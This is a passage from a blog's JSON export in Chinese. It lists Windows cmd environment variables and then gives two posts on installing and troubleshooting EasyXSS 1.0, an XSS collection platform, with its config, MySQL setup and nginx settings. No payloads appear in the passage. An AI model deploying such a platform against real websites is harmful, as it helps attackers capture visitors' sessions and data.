:列出启动当前cmd.exe所使用的命令行。<br />%CMDEXTVERSION% :命令出当前命令处理程序扩展版本号。<br />%CommonProgramFiles% :列出了常用文件的文件夹路径。<br />%COMPUTERNAME% :列出了计算机名。<br />%COMSPEC% :列出了可执行命令外壳（命令处理程序）的路径。<br />%DATE% :列出当前日期。<br />%ERRORLEVEL% :列出了最近使用的命令的错误代码。<br />%HOMEDRIVE% :列出与用户主目录所在的驱动器盘符。<br />%HOMEPATH% :列出用户主目录的完整路径。<br />%HOMESHARE% :列出用户共享主目录的网络路径。<br />%LOGONSEVER% :列出有效的当前登录会话的域名控制器名。<br />%NUMBER_OF_PROCESSORS% :列出了计算机安装的处理器数。<br />%OS% :列出操作[系统]的名字。(Windows XP 和 Windows 2000 列为 Windows_NT.)<br />%Path% :列出了可执行文件的搜索路径。<br />%PATHEXT% :列出操作[系统]认为可被执行的文件扩展名。<br />%PROCESSOR_ARCHITECTURE% :列出了处理器的芯片架构。<br />%PROCESSOR_IDENTFIER% :列出了处理器的描述。<br />%PROCESSOR_LEVEL% :列出了计算机的处理器的型号。<br />%PROCESSOR_REVISION% :列出了处理器的修订号。<br />%ProgramFiles% :列出了Program Files文件夹的路径。<br />%PROMPT% :列出了当前命令解释器的命令提示设置。<br />%RANDOM% :列出界于0 和 32767之间的随机十进制数。<br />%SESSIONNAME% :列出连接到终端服务会话时的连接和会话名。<br />%SYSTEMDRIVE% :列出了Windows启动目录所在驱动器。<br />%SYSTEMROOT% :列出了Windows启动目录的位置。<br />%TEMP% and %TMP% :列出了当前登录的用户可用应用程序的默认临时目录。<br />%TIME% :列出当前时间。<br />%USERDOMAIN% :列出了包含用户帐号的域的名字。<br />%USERNAME% :列出当前登录的用户的名字。<br />%USERPROFILE% :列出当前用户Profile文件位置。<br />%WINDIR% :列出操作[系统]目录的位置。<br />%ALLUSERSPROFILE%&amp;#160;&amp;#160; [本地] 返回“所有用户”配置文件的位置。<br />%APPDATA% [本地]返回默认情况下应用程序存储数据的位置。<br />%CD% [本地] 返回当前目录字符串。<br />%CMDCMDLINE% [本地] 返回用来启动当前的 Cmd.exe 的准确命令行。<br />%CMDEXTVERSION% [系统] 返回当前的“命令处理程序扩展”的版本号。<br />%COMPUTERNAME%&amp;#160;&amp;#160; [系统] 返回计算机的名称。<br />%COMSPEC%&amp;#160;&amp;#160; [系统] 返回命令行解释器可执行程序的准确路径。<br />%DATE%&amp;#160;&amp;#160; [系统] 返回当前日期。使用与 date &#x2F;t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。<br />%ERRORLEVEL%&amp;#160;&amp;#160; [系统] 返回上一条命令的错误代码。通常用非零值表示错误。<br />%HOMEDRIVE%&amp;#160;&amp;#160; [系统] 返回连接到用户主目录的[本地]工作站驱动器号。基于主目录值而设置。用户主目录是在“[本地]用户和组”中指定的。<br />%HOMEPATH%&amp;#160; [系统] 返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“[本地]用户和组”中指定的。<br />%HOMESHARE% [系统] 返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“[本地]用户和组”中指定的。<br />%LOGONSERVER% [本地] 返回验证当前登录会话的域控制器的名称。<br />%NUMBER_OF_PROCESSORS%&amp;#160;&amp;#160; [系统] 指定安装在计算机上的处理器的数目。<br />%OS%[系统] 返回操作[系统]名称。Windows 2000 显示其操作[系统]为 Windows_NT。<br />%PATH%[系统] 指定可执行文件的搜索路径。<br />%PATHEXT% [系统] 返回操作[系统]认为可执行的文件扩展名的列表。<br />%PROCESSOR_ARCHITECTURE%&amp;#160;&amp;#160; [系统] 返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。<br />%PROCESSOR_IDENTFIER% [系统] 返回处理器说明。<br />%PROCESSOR_LEVEL%[系统] 返回计算机上安装的处理器的型号。<br />%PROCESSOR_REVISION% [系统] 返回处理器的版本号。<br />%PROMPT% [本地] 返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。<br />%RANDOM% [系统] 返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。<br />%SYSTEMDRIVE% [系统] 返回包含 Windows server operating system 根目录（即[系统]根目录）的驱动器。<br />%SYSTEMROOT%[系统] 返回 Windows server operating system 根目录的位置。<br />%TEMP% 和 %TMP% [系统]和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。<br />%TIME% [系统] 返回当前时间。使用与 time &#x2F;t 命令相同的格式。由 Cmd.exe 生成。有关 time 命令的详细信息，请参阅 Time。<br />%USERDOMAIN% [本地] 返回包含用户帐户的域的名称。<br />%USERNAME% [本地] 返回当前登录的用户的名称。<br />%USERPROFILE% [本地] 返回当前用户的配置文件的位置。<br />%WINDIR% [系统] 返回操作[系统]目录的位置。<br />%temp%&#x3D;%USERPROFILE%Local SettingsTemp&#x3D;C:Documents andSettingssihochinaLocal SettingsTemp当前用户TEMP缓存变量</p>\n","site":{"data":{}},"excerpt":"","more":"<p>%systemdrive%%homepath%桌面 桌面路径<br />%HOMEDRIVE% &#x3D; C: 当前启动的[系统]的所在分区<br />%SystemRoot% &#x3D; C:WINDOWS 当前启动的[系统]的所在目录<br />%windir%&#x3D;%SystemRoot% &#x3D; C:WINDOWS 当前启动的[系统]的所在目录<br />%USERPROFILE%&#x3D;C:Documents and Settingssihochina当前用户数据变量量%HOMEPATH% &#x3D; C:Documents and Settingssihochina 当前用户环境变量<br />%system% &#x3D; C:WINDOWSSYSTEM32<br />%ALLUSERSPROFILE% ：列出杏没rofile文件位置。<br />%APPDATA% :列出应用程序数据的默认存放位置。<br />%CD% :列出当前目录。<br />%CLIENTNAME% :列出联接到终端服务会话时客户端的NETBIOS名。<br />%CMDCMDLINE% :列出启动当前cmd.exe所使用的命令行。<br />%CMDEXTVERSION% :命令出当前命令处理程序扩展版本号。<br />%CommonProgramFiles% :列出了常用文件的文件夹路径。<br />%COMPUTERNAME% :列出了计算机名。<br />%COMSPEC% :列出了可执行命令外壳（命令处理程序）的路径。<br />%DATE% :列出当前日期。<br />%ERRORLEVEL% :列出了最近使用的命令的错误代码。<br />%HOMEDRIVE% :列出与用户主目录所在的驱动器盘符。<br />%HOMEPATH% :列出用户主目录的完整路径。<br />%HOMESHARE% :列出用户共享主目录的网络路径。<br />%LOGONSEVER% :列出有效的当前登录会话的域名控制器名。<br />%NUMBER_OF_PROCESSORS% :列出了计算机安装的处理器数。<br />%OS% :列出操作[系统]的名字。(Windows XP 和 Windows 2000 列为 Windows_NT.)<br />%Path% :列出了可执行文件的搜索路径。<br />%PATHEXT% :列出操作[系统]认为可被执行的文件扩展名。<br />%PROCESSOR_ARCHITECTURE% :列出了处理器的芯片架构。<br />%PROCESSOR_IDENTFIER% :列出了处理器的描述。<br />%PROCESSOR_LEVEL% :列出了计算机的处理器的型号。<br />%PROCESSOR_REVISION% :列出了处理器的修订号。<br />%ProgramFiles% :列出了Program Files文件夹的路径。<br />%PROMPT% :列出了当前命令解释器的命令提示设置。<br />%RANDOM% :列出界于0 和 32767之间的随机十进制数。<br />%SESSIONNAME% :列出连接到终端服务会话时的连接和会话名。<br />%SYSTEMDRIVE% :列出了Windows启动目录所在驱动器。<br />%SYSTEMROOT% :列出了Windows启动目录的位置。<br />%TEMP% and %TMP% :列出了当前登录的用户可用应用程序的默认临时目录。<br />%TIME% :列出当前时间。<br />%USERDOMAIN% :列出了包含用户帐号的域的名字。<br />%USERNAME% :列出当前登录的用户的名字。<br />%USERPROFILE% :列出当前用户Profile文件位置。<br />%WINDIR% :列出操作[系统]目录的位置。<br />%ALLUSERSPROFILE%&amp;#160;&amp;#160; [本地] 返回“所有用户”配置文件的位置。<br />%APPDATA% [本地]返回默认情况下应用程序存储数据的位置。<br />%CD% [本地] 返回当前目录字符串。<br />%CMDCMDLINE% [本地] 返回用来启动当前的 Cmd.exe 的准确命令行。<br />%CMDEXTVERSION% [系统] 返回当前的“命令处理程序扩展”的版本号。<br />%COMPUTERNAME%&amp;#160;&amp;#160; [系统] 返回计算机的名称。<br />%COMSPEC%&amp;#160;&amp;#160; [系统] 返回命令行解释器可执行程序的准确路径。<br />%DATE%&amp;#160;&amp;#160; [系统] 返回当前日期。使用与 date &#x2F;t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。<br />%ERRORLEVEL%&amp;#160;&amp;#160; [系统] 返回上一条命令的错误代码。通常用非零值表示错误。<br />%HOMEDRIVE%&amp;#160;&amp;#160; [系统] 返回连接到用户主目录的[本地]工作站驱动器号。基于主目录值而设置。用户主目录是在“[本地]用户和组”中指定的。<br />%HOMEPATH%&amp;#160; [系统] 返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“[本地]用户和组”中指定的。<br />%HOMESHARE% [系统] 返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“[本地]用户和组”中指定的。<br />%LOGONSERVER% [本地] 返回验证当前登录会话的域控制器的名称。<br />%NUMBER_OF_PROCESSORS%&amp;#160;&amp;#160; [系统] 指定安装在计算机上的处理器的数目。<br />%OS%[系统] 返回操作[系统]名称。Windows 2000 显示其操作[系统]为 Windows_NT。<br />%PATH%[系统] 指定可执行文件的搜索路径。<br />%PATHEXT% [系统] 返回操作[系统]认为可执行的文件扩展名的列表。<br />%PROCESSOR_ARCHITECTURE%&amp;#160;&amp;#160; [系统] 返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。<br />%PROCESSOR_IDENTFIER% [系统] 返回处理器说明。<br />%PROCESSOR_LEVEL%[系统] 返回计算机上安装的处理器的型号。<br />%PROCESSOR_REVISION% [系统] 返回处理器的版本号。<br />%PROMPT% [本地] 返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。<br />%RANDOM% [系统] 返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。<br />%SYSTEMDRIVE% [系统] 返回包含 Windows server operating system 根目录（即[系统]根目录）的驱动器。<br />%SYSTEMROOT%[系统] 返回 Windows server operating system 根目录的位置。<br />%TEMP% 和 %TMP% [系统]和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。<br />%TIME% [系统] 返回当前时间。使用与 time &#x2F;t 命令相同的格式。由 Cmd.exe 生成。有关 time 命令的详细信息，请参阅 Time。<br />%USERDOMAIN% [本地] 返回包含用户帐户的域的名称。<br />%USERNAME% [本地] 返回当前登录的用户的名称。<br />%USERPROFILE% [本地] 返回当前用户的配置文件的位置。<br />%WINDIR% [系统] 返回操作[系统]目录的位置。<br />%temp%&#x3D;%USERPROFILE%Local SettingsTemp&#x3D;C:Documents andSettingssihochinaLocal SettingsTemp当前用户TEMP缓存变量</p>\n"},{"title":"安装EasyXSS 1.0","date":"2013-04-13T04:57:37.000Z","_content":"应基友要求写一遍安装EasyXSS 1.0的文章,就在windows临时搭建了一下XSS环境，使用的是XAMPP搭建的，比较方便。\nXAMPP截图\n<a href=\"/images/2013/04/11-150x1501.png\"><img src=\"/images/2013/04/11-150x1501.png\" alt=\"11-150x150\" width=\"528\" height=\"383\" class=\"alignnone size-full wp-image-344\" /></a>\n1.apache 配置要点\n<pre>\nDocumentRoot “D:/xampp/htdocs”\n</pre>\n2.解压EASYXSS为xss到web目录下\n<pre>\n修改配置文件D:xampphtdocsxssAppConfconfig.php\n<?php\n    return array(\n        'DEFAULT_MODULE'     => 'User',\n        'URL_MODEL'          => '1',\n        'SESSION_AUTO_START' => true,\n        'DB_DSN' => 'mysql://root:@127.0.0.1:3306/xss_tw',\n        'DB_PREFIX' => 'xss_',\n        'MAIL_ADDRESS'=>'info@xss.tw',\n        'MAIL_SMTP'=>'smtp.gmail.com',\n        'MAIL_LOGINNAME'=>'info@xss.tw',\n        'MAIL_PASSWORD'=>'',\n        'MAIL_SENDER'=>'info',\n        'MAIL_PORT'=>'465',\n        'TMPL_PARSE_STRING' =>array(\n        \t'__SITENAME__' =>'EasyXSS 1.0',\n        \t'__SITETITLE__'=>'EasyXSS',\n        \t),\n    );\n?>\n</pre>\nroot为用户名，密码为空\n3.创建数据库\n<pre>\nmysql> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| cdcol              |\n| mysql              |\n| performance_schema |\n| phpmyadmin         |\n| webauth            |\n+--------------------+\n6 rows in set (0.00 sec)\nmysql> create database xss_tw;\nQuery OK, 1 row affected (0.00 sec)\nmysql> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| cdcol              |\n| mysql              |\n| performance_schema |\n| phpmyadmin         |\n| webauth            |\n| xss_tw             |\n+--------------------+\n7 rows in set (0.00 sec)\nD:xamppmysqlbin>mysql.exe -uroot xss_tw -p < data.sql\nEnter password:\nD:xamppmysqlbin>mysql.exe -uroot -p\nEnter password:\nWelcome to the MySQL monitor.  Commands end with ; or g.\nYour MySQL connection id is 5\nServer version: 5.5.8 MySQL Community Server (GPL)\nCopyright (c) 2000, 2010, Oracle and/or its affiliates. All rights reserved.\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\nType 'help;' or 'h' for help. Type 'c' to clear the current input statement.\nmysql> use xss_tw\nDatabase changed\nmysql> show tables;\n+------------------+\n| Tables_in_xss_tw |\n+------------------+\n| xss_ipdata       |\n| xss_key          |\n| xss_keyemail     |\n| xss_project      |\n| xss_user         |\n| xss_xssresult    |\n+------------------+\n6 rows in set (0.00 sec)\nmysql> select * from xss_key\n    -> ;\n+-----+-------+------------+-------+------+\n| iid | ctime | key        | utime | user |\n+-----+-------+------------+-------+------+\n|   1 |     0 | 1234567890 |     0 |      |\n+-----+-------+------------+-------+------+\n1 row in set (0.02 sec)\n</pre>\n4.注册用户\n<a href=\"/images/2013/04/22-150x1501.gif\"><img src=\"/images/2013/04/22-150x1501.gif\" alt=\"22-150x150\" width=\"835\" height=\"632\" class=\"alignnone size-full wp-image-345\" /></a>\n5.登录\n<a href=\"/images/2013/04/33-150x1501.gif\"><img src=\"/images/2013/04/33-150x1501.gif\" alt=\"33-150x150\" width=\"1246\" height=\"437\" class=\"alignnone size-full wp-image-346\" /></a>\n6.测试\n<a href=\"/images/2013/04/44-150x1501.gif\"><img src=\"/images/2013/04/44-150x1501.gif\" alt=\"44-150x150\" width=\"1171\" height=\"417\" class=\"alignnone size-full wp-image-347\" /></a>","source":"_posts/安装EasyXSS-1.0.md","raw":"title: 安装EasyXSS 1.0\ncategories: [网络工程,Php编程]\ntags: [xss;easyxss]\ndate: 2013-04-13 12:57:37\n---\n应基友要求写一遍安装EasyXSS 1.0的文章,就在windows临时搭建了一下XSS环境，使用的是XAMPP搭建的，比较方便。\nXAMPP截图\n<a href=\"/images/2013/04/11-150x1501.png\"><img src=\"/images/2013/04/11-150x1501.png\" alt=\"11-150x150\" width=\"528\" height=\"383\" class=\"alignnone size-full wp-image-344\" /></a>\n1.apache 配置要点\n<pre>\nDocumentRoot “D:/xampp/htdocs”\n</pre>\n2.解压EASYXSS为xss到web目录下\n<pre>\n修改配置文件D:xampphtdocsxssAppConfconfig.php\n<?php\n    return array(\n        'DEFAULT_MODULE'     => 'User',\n        'URL_MODEL'          => '1',\n        'SESSION_AUTO_START' => true,\n        'DB_DSN' => 'mysql://root:@127.0.0.1:3306/xss_tw',\n        'DB_PREFIX' => 'xss_',\n        'MAIL_ADDRESS'=>'info@xss.tw',\n        'MAIL_SMTP'=>'smtp.gmail.com',\n        'MAIL_LOGINNAME'=>'info@xss.tw',\n        'MAIL_PASSWORD'=>'',\n        'MAIL_SENDER'=>'info',\n        'MAIL_PORT'=>'465',\n        'TMPL_PARSE_STRING' =>array(\n        \t'__SITENAME__' =>'EasyXSS 1.0',\n        \t'__SITETITLE__'=>'EasyXSS',\n        \t),\n    );\n?>\n</pre>\nroot为用户名，密码为空\n3.创建数据库\n<pre>\nmysql> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| cdcol              |\n| mysql              |\n| performance_schema |\n| phpmyadmin         |\n| webauth            |\n+--------------------+\n6 rows in set (0.00 sec)\nmysql> create database xss_tw;\nQuery OK, 1 row affected (0.00 sec)\nmysql> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| cdcol              |\n| mysql              |\n| performance_schema |\n| phpmyadmin         |\n| webauth            |\n| xss_tw             |\n+--------------------+\n7 rows in set (0.00 sec)\nD:xamppmysqlbin>mysql.exe -uroot xss_tw -p < data.sql\nEnter password:\nD:xamppmysqlbin>mysql.exe -uroot -p\nEnter password:\nWelcome to the MySQL monitor.  Commands end with ; or g.\nYour MySQL connection id is 5\nServer version: 5.5.8 MySQL Community Server (GPL)\nCopyright (c) 2000, 2010, Oracle and/or its affiliates. All rights reserved.\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\nType 'help;' or 'h' for help. Type 'c' to clear the current input statement.\nmysql> use xss_tw\nDatabase changed\nmysql> show tables;\n+------------------+\n| Tables_in_xss_tw |\n+------------------+\n| xss_ipdata       |\n| xss_key          |\n| xss_keyemail     |\n| xss_project      |\n| xss_user         |\n| xss_xssresult    |\n+------------------+\n6 rows in set (0.00 sec)\nmysql> select * from xss_key\n    -> ;\n+-----+-------+------------+-------+------+\n| iid | ctime | key        | utime | user |\n+-----+-------+------------+-------+------+\n|   1 |     0 | 1234567890 |     0 |      |\n+-----+-------+------------+-------+------+\n1 row in set (0.02 sec)\n</pre>\n4.注册用户\n<a href=\"/images/2013/04/22-150x1501.gif\"><img src=\"/images/2013/04/22-150x1501.gif\" alt=\"22-150x150\" width=\"835\" height=\"632\" class=\"alignnone size-full wp-image-345\" /></a>\n5.登录\n<a href=\"/images/2013/04/33-150x1501.gif\"><img src=\"/images/2013/04/33-150x1501.gif\" alt=\"33-150x150\" width=\"1246\" height=\"437\" class=\"alignnone size-full wp-image-346\" /></a>\n6.测试\n<a href=\"/images/2013/04/44-150x1501.gif\"><img src=\"/images/2013/04/44-150x1501.gif\" alt=\"44-150x150\" width=\"1171\" height=\"417\" class=\"alignnone size-full wp-image-347\" /></a>","slug":"安装EasyXSS-1.0","published":1,"updated":"2023-04-22T05:38:45.041Z","_id":"clgrjlxki008v7opi3wkg5qnx","comments":1,"layout":"post","photos":[],"link":"","content":"<p>应基友要求写一遍安装EasyXSS 1.0的文章,就在windows临时搭建了一下XSS环境，使用的是XAMPP搭建的，比较方便。<br>XAMPP截图<br><a href=\"/images/2013/04/11-150x1501.png\"><img src=\"/images/2013/04/11-150x1501.png\" alt=\"11-150x150\" width=\"528\" height=\"383\" class=\"alignnone size-full wp-image-344\" /></a><br>1.apache 配置要点</p>\n<pre>\nDocumentRoot “D:/xampp/htdocs”\n</pre>\n<p>2.解压EASYXSS为xss到web目录下</p>\n<pre>\n修改配置文件D:xampphtdocsxssAppConfconfig.php\n<?php\n    return array(\n        'DEFAULT_MODULE'     => 'User',\n        'URL_MODEL'          => '1',\n        'SESSION_AUTO_START' => true,\n        'DB_DSN' => 'mysql://root:@127.0.0.1:3306/xss_tw',\n        'DB_PREFIX' => 'xss_',\n        'MAIL_ADDRESS'=>'info@xss.tw',\n        'MAIL_SMTP'=>'smtp.gmail.com',\n        'MAIL_LOGINNAME'=>'info@xss.tw',\n        'MAIL_PASSWORD'=>'',\n        'MAIL_SENDER'=>'info',\n        'MAIL_PORT'=>'465',\n        'TMPL_PARSE_STRING' =>array(\n            '__SITENAME__' =>'EasyXSS 1.0',\n            '__SITETITLE__'=>'EasyXSS',\n            ),\n    );\n?>\n</pre>\n<p>root为用户名，密码为空<br>3.创建数据库</p>\n<pre>\nmysql> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| cdcol              |\n| mysql              |\n| performance_schema |\n| phpmyadmin         |\n| webauth            |\n+--------------------+\n6 rows in set (0.00 sec)\nmysql> create database xss_tw;\nQuery OK, 1 row affected (0.00 sec)\nmysql> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| cdcol              |\n| mysql              |\n| performance_schema |\n| phpmyadmin         |\n| webauth            |\n| xss_tw             |\n+--------------------+\n7 rows in set (0.00 sec)\nD:xamppmysqlbin>mysql.exe -uroot xss_tw -p < data.sql\nEnter password:\nD:xamppmysqlbin>mysql.exe -uroot -p\nEnter password:\nWelcome to the MySQL monitor.  Commands end with ; or g.\nYour MySQL connection id is 5\nServer version: 5.5.8 MySQL Community Server (GPL)\nCopyright (c) 2000, 2010, Oracle and/or its affiliates. All rights reserved.\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\nType 'help;' or 'h' for help. Type 'c' to clear the current input statement.\nmysql> use xss_tw\nDatabase changed\nmysql> show tables;\n+------------------+\n| Tables_in_xss_tw |\n+------------------+\n| xss_ipdata       |\n| xss_key          |\n| xss_keyemail     |\n| xss_project      |\n| xss_user         |\n| xss_xssresult    |\n+------------------+\n6 rows in set (0.00 sec)\nmysql> select * from xss_key\n    -> ;\n+-----+-------+------------+-------+------+\n| iid | ctime | key        | utime | user |\n+-----+-------+------------+-------+------+\n|   1 |     0 | 1234567890 |     0 |      |\n+-----+-------+------------+-------+------+\n1 row in set (0.02 sec)\n</pre>\n<p>4.注册用户<br><a href=\"/images/2013/04/22-150x1501.gif\"><img src=\"/images/2013/04/22-150x1501.gif\" alt=\"22-150x150\" width=\"835\" height=\"632\" class=\"alignnone size-full wp-image-345\" /></a><br>5.登录<br><a href=\"/images/2013/04/33-150x1501.gif\"><img src=\"/images/2013/04/33-150x1501.gif\" alt=\"33-150x150\" width=\"1246\" height=\"437\" class=\"alignnone size-full wp-image-346\" /></a><br>6.测试<br><a href=\"/images/2013/04/44-150x1501.gif\"><img src=\"/images/2013/04/44-150x1501.gif\" alt=\"44-150x150\" width=\"1171\" height=\"417\" class=\"alignnone size-full wp-image-347\" /></a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>应基友要求写一遍安装EasyXSS 1.0的文章,就在windows临时搭建了一下XSS环境，使用的是XAMPP搭建的，比较方便。<br>XAMPP截图<br><a href=\"/images/2013/04/11-150x1501.png\"><img src=\"/images/2013/04/11-150x1501.png\" alt=\"11-150x150\" width=\"528\" height=\"383\" class=\"alignnone size-full wp-image-344\" /></a><br>1.apache 配置要点</p>\n<pre>\nDocumentRoot “D:/xampp/htdocs”\n</pre>\n<p>2.解压EASYXSS为xss到web目录下</p>\n<pre>\n修改配置文件D:xampphtdocsxssAppConfconfig.php\n<?php\n    return array(\n        'DEFAULT_MODULE'     => 'User',\n        'URL_MODEL'          => '1',\n        'SESSION_AUTO_START' => true,\n        'DB_DSN' => 'mysql://root:@127.0.0.1:3306/xss_tw',\n        'DB_PREFIX' => 'xss_',\n        'MAIL_ADDRESS'=>'info@xss.tw',\n        'MAIL_SMTP'=>'smtp.gmail.com',\n        'MAIL_LOGINNAME'=>'info@xss.tw',\n        'MAIL_PASSWORD'=>'',\n        'MAIL_SENDER'=>'info',\n        'MAIL_PORT'=>'465',\n        'TMPL_PARSE_STRING' =>array(\n            '__SITENAME__' =>'EasyXSS 1.0',\n            '__SITETITLE__'=>'EasyXSS',\n            ),\n    );\n?>\n</pre>\n<p>root为用户名，密码为空<br>3.创建数据库</p>\n<pre>\nmysql> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| cdcol              |\n| mysql              |\n| performance_schema |\n| phpmyadmin         |\n| webauth            |\n+--------------------+\n6 rows in set (0.00 sec)\nmysql> create database xss_tw;\nQuery OK, 1 row affected (0.00 sec)\nmysql> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| cdcol              |\n| mysql              |\n| performance_schema |\n| phpmyadmin         |\n| webauth            |\n| xss_tw             |\n+--------------------+\n7 rows in set (0.00 sec)\nD:xamppmysqlbin>mysql.exe -uroot xss_tw -p < data.sql\nEnter password:\nD:xamppmysqlbin>mysql.exe -uroot -p\nEnter password:\nWelcome to the MySQL monitor.  Commands end with ; or g.\nYour MySQL connection id is 5\nServer version: 5.5.8 MySQL Community Server (GPL)\nCopyright (c) 2000, 2010, Oracle and/or its affiliates. All rights reserved.\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\nType 'help;' or 'h' for help. Type 'c' to clear the current input statement.\nmysql> use xss_tw\nDatabase changed\nmysql> show tables;\n+------------------+\n| Tables_in_xss_tw |\n+------------------+\n| xss_ipdata       |\n| xss_key          |\n| xss_keyemail     |\n| xss_project      |\n| xss_user         |\n| xss_xssresult    |\n+------------------+\n6 rows in set (0.00 sec)\nmysql> select * from xss_key\n    -> ;\n+-----+-------+------------+-------+------+\n| iid | ctime | key        | utime | user |\n+-----+-------+------------+-------+------+\n|   1 |     0 | 1234567890 |     0 |      |\n+-----+-------+------------+-------+------+\n1 row in set (0.02 sec)\n</pre>\n<p>4.注册用户<br><a href=\"/images/2013/04/22-150x1501.gif\"><img src=\"/images/2013/04/22-150x1501.gif\" alt=\"22-150x150\" width=\"835\" height=\"632\" class=\"alignnone size-full wp-image-345\" /></a><br>5.登录<br><a href=\"/images/2013/04/33-150x1501.gif\"><img src=\"/images/2013/04/33-150x1501.gif\" alt=\"33-150x150\" width=\"1246\" height=\"437\" class=\"alignnone size-full wp-image-346\" /></a><br>6.测试<br><a href=\"/images/2013/04/44-150x1501.gif\"><img src=\"/images/2013/04/44-150x1501.gif\" alt=\"44-150x150\" width=\"1171\" height=\"417\" class=\"alignnone size-full wp-image-347\" /></a></p>\n"},{"title":"安装EASYXSS的一些小问题","date":"2013-04-13T04:53:38.000Z","_content":"EASYXSS项目开源了，很给力的项目，下载地址，\n<pre>\nhttp://wdot.cc/Attack/49.html\n</pre>\n在安装过程中，出现了几个小问题，也许别人会遇到。\n1.数据库连接问题，\n使用ThinkPhp DB_DSN连接方式，用户和密码之间用：号\n2.’URL_MODEL’ => ’0′,\n如果’URL_MODEL’ => ’0′的话，官方推荐这种方式，但是必须要web服务器支持PATH_INFO,我使用的NGINX默认是不支持的，需要在PHP规则中修改下面代码\n<pre>\nlocation ~ .php($|/) {\nroot /wwwroot;\nfastcgi_pass   127.0.0.1:9000;\nfastcgi_index  index.php;\nfastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;\n#Add pathinfo Start\nfastcgi_split_path_info ^(.+.php)(.*)$;\nfastcgi_param PATH_INFO $fastcgi_path_info;\n#Add Pathinfo End\ninclude        fastcgi_params;\n}\n</pre>\n3.’URL_MODEL’ => ’3′\n开始我用的’URL_MODEL’ => ’3′,访问后台是正常了，但是一直得不到数据，一直得到”你妹的”，给个妹子吧 。\n看了一下代码AppLibActionEmptyAction.class.php,在GET操作 URL中，没有index，最终调用不了index 函数\n把index函数修改为_empty就可以，不是很完美，php不是太懂，就讲究着用吧 。","source":"_posts/安装EASYXSS的一些小问题.md","raw":"title: 安装EASYXSS的一些小问题\ncategories: [网络安全]\ntags: []\ndate: 2013-04-13 12:53:38\n---\nEASYXSS项目开源了，很给力的项目，下载地址，\n<pre>\nhttp://wdot.cc/Attack/49.html\n</pre>\n在安装过程中，出现了几个小问题，也许别人会遇到。\n1.数据库连接问题，\n使用ThinkPhp DB_DSN连接方式，用户和密码之间用：号\n2.’URL_MODEL’ => ’0′,\n如果’URL_MODEL’ => ’0′的话，官方推荐这种方式，但是必须要web服务器支持PATH_INFO,我使用的NGINX默认是不支持的，需要在PHP规则中修改下面代码\n<pre>\nlocation ~ .php($|/) {\nroot /wwwroot;\nfastcgi_pass   127.0.0.1:9000;\nfastcgi_index  index.php;\nfastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;\n#Add pathinfo Start\nfastcgi_split_path_info ^(.+.php)(.*)$;\nfastcgi_param PATH_INFO $fastcgi_path_info;\n#Add Pathinfo End\ninclude        fastcgi_params;\n}\n</pre>\n3.’URL_MODEL’ => ’3′\n开始我用的’URL_MODEL’ => ’3′,访问后台是正常了，但是一直得不到数据，一直得到”你妹的”，给个妹子吧 。\n看了一下代码AppLibActionEmptyAction.class.php,在GET操作 URL中，没有index，最终调用不了index 函数\n把index函数修改为_empty就可以，不是很完美，php不是太懂，就讲究着用吧 。","slug":"安装EASYXSS的一些小问题","published":1,"updated":"2023-04-22T05:38:45.038Z","_id":"clgrjlxkj008x7opiepm9dj85","comments":1,"layout":"post","photos":[],"link":"","content":"<p>EASYXSS项目开源了，很给力的项目，下载地址，</p>\n<pre>\nhttp://wdot.cc/Attack/49.html\n</pre>\n<p>在安装过程中，出现了几个小问题，也许别人会遇到。<br>1.数据库连接问题，<br>使用ThinkPhp DB_DSN连接方式，用户和密码之间用：号<br>2.’URL_MODEL’ &#x3D;&gt; ’0′,<br>如果’URL_MODEL’ &#x3D;&gt; ’0′的话，官方推荐这种方式，但是必须要web服务器支持PATH_INFO,我使用的NGINX默认是不支持的，需要在PHP规则中修改下面代码</p>\n<pre>\nlocation ~ .php($|/) {\nroot /wwwroot;\nfastcgi_pass   127.0.0.1:9000;\nfastcgi_index  index.php;\nfastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;\n#Add pathinfo Start\nfastcgi_split_path_info ^(.+.php)(.*)$;\nfastcgi_param PATH_INFO $fastcgi_path_info;\n#Add Pathinfo End\ninclude        fastcgi_params;\n}\n</pre>\n<p>3.’URL_MODEL’ &#x3D;&gt; ’3′<br>开始我用的’URL_MODEL’ &#x3D;&gt; ’3′,访问后台是正常了，但是一直得不到数据，一直得到”你妹的”，给个妹子吧 。<br>看了一下代码AppLibActionEmptyAction.class.php,在GET操作 URL中，没有index，最终调用不了index 函数<br>把index函数修改为_empty就可以，不是很完美，php不是太懂，就讲究着用吧 